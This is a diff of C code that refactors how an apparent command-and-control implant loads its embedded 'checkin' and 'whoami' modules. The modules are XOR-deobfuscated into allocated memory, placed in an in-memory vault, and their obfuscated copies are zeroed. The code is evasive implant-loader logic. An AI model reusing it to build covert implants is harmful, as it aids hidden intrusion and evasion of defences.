@@ -30,24 +30,38 @@ char * find_whoami_pico() {
     return (char *)&__WHOAMI_PICO__;
 }
 
+char *deobfuscate_pico(_EMBEDDED_PICO *pico, char *key, int keylen) {
+	char *output = KERNEL32$VirtualAlloc(0, pico->length, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	xorify(output, pico->value, pico->length, key, keylen);
+	return output;
+}
+
 BuiltinPicos load_builtin_picos(DataVault *vault, char *key) {
 	BuiltinPicos picos = { 0 };
 
+	// Load default names for the built-in PICOs.
 	picos.checkin = "_builtin_checkin";
-	_EMBEDDED_PICO *checkin = (_EMBEDDED_PICO *) find_checkin_pico();
-	char *raw_checkin = KERNEL32$VirtualAlloc(0, checkin->length, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-	xorify(raw_checkin, checkin->value, checkin->length, key, XORKEY_LEN);
-	add_to_vault(vault, picos.checkin, raw_checkin, checkin->length);
-	for (int i = 0; i < checkin->length; i++) { checkin->value[i] = 0; }
-	KERNEL32$VirtualFree(raw_checkin, 0, MEM_RELEASE);
-	
 	picos.whoami = "_builtin_whoami";
+	
+	// Get embedded and obfuscated PICO data.
+	_EMBEDDED_PICO *checkin = (_EMBEDDED_PICO *) find_checkin_pico();
 	_EMBEDDED_PICO *whoami = (_EMBEDDED_PICO *) find_whoami_pico();
-	char *raw_whoami = KERNEL32$VirtualAlloc(0, whoami->length, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-	xorify(raw_whoami, whoami->value, whoami->length, key, XORKEY_LEN);
-	add_to_vault(vault, picos.whoami, raw_whoami, whoami->length);
+	
+	// Deobfuscate PICOs.
+	char *checkin_buf = deobfuscate_pico(checkin, key, XORKEY_LEN);
+	char *whoami_buf = deobfuscate_pico(whoami, key, XORKEY_LEN);
+	
+	// Copy deobfuscated PICOs into the in-memory vault.
+	add_to_vault(vault, picos.checkin, checkin_buf, checkin->length);
+	add_to_vault(vault, picos.whoami, whoami_buf, whoami->length);
+	
+	// Free temporary buffers.
+	KERNEL32$VirtualFree(checkin_buf, 0, MEM_RELEASE);
+	KERNEL32$VirtualFree(whoami_buf, 0, MEM_RELEASE);
+	
+	// Zero out the obfuscated PICO data.
+	for (int i = 0; i < checkin->length; i++) { checkin->value[i] = 0; }
 	for (int i = 0; i < whoami->length; i++) { whoami->value[i] = 0; }
-	KERNEL32$VirtualFree(raw_whoami, 0, MEM_RELEASE);
 	
 	return picos;
 }
